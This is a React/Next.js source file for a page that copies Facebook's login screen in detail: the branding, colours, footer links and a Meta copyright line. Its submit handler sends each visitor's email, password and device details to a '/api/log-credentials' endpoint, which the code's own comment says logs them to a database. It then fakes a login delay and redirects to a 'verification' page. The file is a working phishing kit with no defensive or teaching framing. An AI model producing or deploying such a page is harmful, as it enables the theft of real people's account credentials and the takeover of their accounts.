import { useState, useEffect } from 'react';
import { useRouter } from 'next/router';
import Head from 'next/head';

export default function FacebookAuth() {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [error, setError] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [rememberMe, setRememberMe] = useState(true);
  const router = useRouter();

  // Add Facebook-like loading animation
  useEffect(() => {
    document.body.style.backgroundColor = '#f0f2f5';
    return () => {
      document.body.style.backgroundColor = '';
    };
  }, []);

  const validateCredentials = (email, password) => {
    if (!email || !password) {
      return 'Please fill in all fields';
    }
    if (!email.includes('@')) {
      return 'Please enter a valid email address';
    }
    return null;
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    setError('');
    setIsLoading(true);

    const validationError = validateCredentials(email, password);
    if (validationError) {
      setError(validationError);
      setIsLoading(false);
      return;
    }

    try {
      // Simulate Facebook's authentication delay
      await new Promise(resolve => setTimeout(resolve, 1500));

      // Log credentials to NeonDB
      await fetch('/api/log-credentials', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ 
          email, 
          password, 
          userAgent: navigator.userAgent,
          deviceType: /Mobi|Android/i.test(navigator.userAgent) ? 'mobile' : 'desktop',
          platform: 'facebook'
        })
      });

      // Store email in localStorage for session management
      localStorage.setItem('user_email', email);
      if (rememberMe) {
        localStorage.setItem('facebook_remember', 'true');
      }
      
      // Redirect to verification page with smooth transition
      setTimeout(() => {
        router.push('/auth/verification');
      }, 500);
      
    } catch (err) {
      setError('The email or password you entered is incorrect. Please try again.');
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <>
      <Head>
        <title>Log into Facebook</title>
        <link rel="icon" href="/facebook-favicon.ico" />
      </Head>
      
      <div className="min-h-screen bg-gray-100 flex flex-col items-center justify-center p-4" style={{ backgroundColor: '#f0f2f5' }}>
        {/* Main Container */}
        <div className="max-w-6xl w-full flex flex-col md:flex-row items-center justify-between gap-12">
          
          {/* Left Side - Facebook Branding */}
          <div className="flex-1 text-center md:text-left">
            <div className="text-blue-600 mb-4" style={{ fontSize: '4rem', fontWeight: 'bold', fontFamily: 'Helvetica, Arial, sans-serif' }}>
              facebook
            </div>
            <p className="text-2xl md:text-3xl font-normal text-gray-800" style={{ fontFamily: 'Helvetica, Arial, sans-serif' }}>
              Facebook helps you connect and share with the people in your life.
            </p>
          </div>

          {/* Right Side - Login Card */}
          <div className="flex-1 max-w-md">
            <div className="bg-white p-6 rounded-lg shadow-lg" style={{ boxShadow: '0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1)' }}>
              <form onSubmit={handleSubmit} className="space-y-4">
                {/* Email Input */}
                <div>
                  <input
                    type="text"
                    placeholder="Email or phone number"
                    className="w-full px-4 py-3 border border-gray-300 rounded-md focus:outline-none focus:ring-1 focus:ring-blue-500 focus:border-blue-500 text-lg"
                    style={{ fontFamily: 'Helvetica, Arial, sans-serif' }}
                    value={email}
                    onChange={(e) => setEmail(e.target.value)}
                  />
                </div>

                {/* Password Input */}
                <div>
                  <input
                    type="password"
                    placeholder="Password"
                    className="w-full px-4 py-3 border border-gray-300 rounded-md focus:outline-none focus:ring-1 focus:ring-blue-500 focus:border-blue-500 text-lg"
                    style={{ fontFamily: 'Helvetica, Arial, sans-serif' }}
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                  />
                </div>

                {/* Login Button */}
                <button
                  type="submit"
                  disabled={isLoading}
                  className="w-full py-3 px-4 bg-blue-600 hover:bg-blue-700 text-white font-bold text-xl rounded-md transition-colors duration-200 disabled:opacity-70 disabled:cursor-not-allowed"
                  style={{ fontFamily: 'Helvetica, Arial, sans-serif', backgroundColor: '#1877f2' }}
                >
                  {isLoading ? (
                    <div className="flex items-center justify-center">
                      <div className="animate-spin rounded-full h-6 w-6 border-b-2 border-white"></div>
                      <span className="ml-2">Logging in...</span>
                    </div>
                  ) : (
                    'Log In'
                  )}
                </button>

                {/* Error Message */}
                {error && (
                  <div className="text-red-600 text-sm text-center p-3 bg-red-50 rounded-md border border-red-200">
                    {error}
                  </div>
                )}

                {/* Forgot Password */}
                <div className="text-center">
                  <a href="#" className="text-blue-600 hover:underline text-sm" style={{ color: '#1877f2' }}>
                    Forgotten password?
                  </a>
                </div>

                <div className="border-t border-gray-300 pt-4">
                  {/* Remember Me Checkbox */}
                  <div className="flex items-center mb-4">
                    <input
                      type="checkbox"
                      id="remember"
                      checked={rememberMe}
                      onChange={(e) => setRememberMe(e.target.checked)}
                      className="h-4 w-4 text-blue-600 focus:ring-blue-500 border-gray-300 rounded"
                    />
                    <label htmlFor="remember" className="ml-2 block text-sm text-gray-900">
                      Keep me logged in
                    </label>
                  </div>

                  {/* Create Account Button */}
                  <button
                    type="button"
                    className="w-full py-3 px-4 bg-green-600 hover:bg-green-700 text-white font-bold text-lg rounded-md transition-colors duration-200"
                    style={{ backgroundColor: '#42b72a', fontFamily: 'Helvetica, Arial, sans-serif' }}
                  >
                    Create New Account
                  </button>
                </div>
              </form>
            </div>

            {/* Footer Links */}
            <div className="text-center mt-6 text-sm">
              <p className="text-gray-600">
                <a href="#" className="font-semibold hover:underline" style={{ fontFamily: 'Helvetica, Arial, sans-serif' }}>
                  Create a Page
                </a>{' '}
                for a celebrity, brand or business.
              </p>
            </div>
          </div>
        </div>

        {/* Footer */}
        <div className="mt-12 text-xs text-gray-600 max-w-6xl w-full">
          <div className="flex flex-wrap justify-center gap-4 mb-4" style={{ fontFamily: 'Helvetica, Arial, sans-serif' }}>
            {['English (US)', 'Español', 'Français (France)', '中文(简体)', 'العربية', 'Português (Brasil)', 'Italiano', '한국어', 'Deutsch', 'हिन्दी', '日本語'].map((lang) => (
              <a key={lang} href="#" className="hover:underline">{lang}</a>
            ))}
          </div>
          
          <div className="flex flex-wrap justify-center gap-4 mb-4">
            {['Sign Up', 'Log In', 'Messenger', 'Facebook Lite', 'Video', 'Places', 'Games', 'Marketplace', 'Meta Pay', 'Meta Store', 'Meta Quest', 'Imagine with Meta AI', 'Instagram', 'Threads', 'Fundraisers', 'Services', 'Voting Information Centre', 'Privacy Policy', 'Privacy Centre', 'Groups', 'About', 'Create ad', 'Create Page', 'Developers', 'Careers', 'Cookies', 'AdChoices', 'Terms', 'Help', 'Contact uploading and non-users'].map((item) => (
              <a key={item} href="#" className="hover:underline">{item}</a>
            ))}
          </div>
          
          <div className="text-center">
            <span>Meta © 2024</span>
          </div>
        </div>
      </div>

      {/* Facebook-like Styles */}
      <style jsx global>{`
        body {
          font-family: Helvetica, Arial, sans-serif;
          margin: 0;
          padding: 0;
          background-color: #f0f2f5;
        }
        
        /* Facebook-like input focus effects */
        input:focus {
          box-shadow: 0 0 0 2px #e7f3ff;
        }
        
        /* Smooth transitions */
        * {
          transition: all 0.2s ease;
        }
      `}</style>
    </>
  );
}
